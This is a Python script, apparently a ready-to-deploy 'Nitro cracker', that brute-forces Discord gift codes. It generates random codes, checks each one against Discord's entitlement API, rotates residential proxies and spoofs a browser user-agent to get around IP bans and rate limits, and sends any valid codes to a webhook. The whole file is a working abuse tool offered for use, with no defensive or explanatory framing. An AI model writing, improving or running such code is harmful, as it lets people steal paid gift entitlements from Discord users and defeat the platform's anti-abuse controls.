# language: Python, file: nitro_cracker.py, target: Railway / Linux, Python 3.10+
# *Railway Datacenter IPs are blocked by Discord. You MUST populate PROXIES.*

import asyncio
import aiohttp
import random
import string
import os
from colorama import Fore, init

init(autoreset=True)

# --- CONFIGURATION ---
THREADS = 10 # Railway free tier has limited CPU. Keep this low.
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "") 

# RAILWAY WARNING: Railway IPs are flagged. Use Residential Proxies here.
# Format: "http://user:pass@ip:port" or "socks5://ip:port"
PROXIES = [
    # "http://user:pass@192.168.1.100:8080",
]

CHARSET = string.ascii_uppercase + string.digits

def generate_code():
    return ''.join(random.choices(CHARSET, k=16))

async def check_code(session, code, proxy):
    url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
            if resp.status == 200:
                data = await resp.json()
                if data.get("uses", 0) < data.get("max_uses", 1):
                    print(f"\n{Fore.GREEN}[!!!] VALID CODE FOUND: discord.gift/{code}")
                    if WEBHOOK_URL:
                        await send_webhook(session, code)
                    return True
            elif resp.status == 429:
                retry = (await resp.json()).get("retry_after", 1.0)
                print(f"{Fore.RED}[!] Rate limited on {proxy}. Sleeping {retry}s")
                await asyncio.sleep(retry)
    except Exception:
        pass
    return False

async def send_webhook(session, code):
    payload = {"content": f"Valid Nitro Gift: https://discord.gift/{code}"}
    try:
        async with session.post(WEBHOOK_URL, json=payload) as resp:
            pass
    except Exception:
        pass

async def worker(session, semaphore):
    while True:
        async with semaphore:
            proxy = random.choice(PROXIES) if PROXIES else None
            code = generate_code()
            await check_code(session, code, proxy)
            await asyncio.sleep(0.05)

async def main():
    print(f"{Fore.CYAN}[*] Starting Gift Cracker on Railway...")
    
    if not PROXIES:
        print(f"{Fore.YELLOW}[!] WARNING: No proxies loaded. Railway IP will be banned immediately.")
    
    semaphore = asyncio.Semaphore(THREADS)
    connector = aiohttp.TCPConnector(limit=THREADS, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session, semaphore)) for _ in range(THREADS)]
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.CYAN}[*] Stopping...")

if __name__ == "__main__":
    asyncio.run(main())
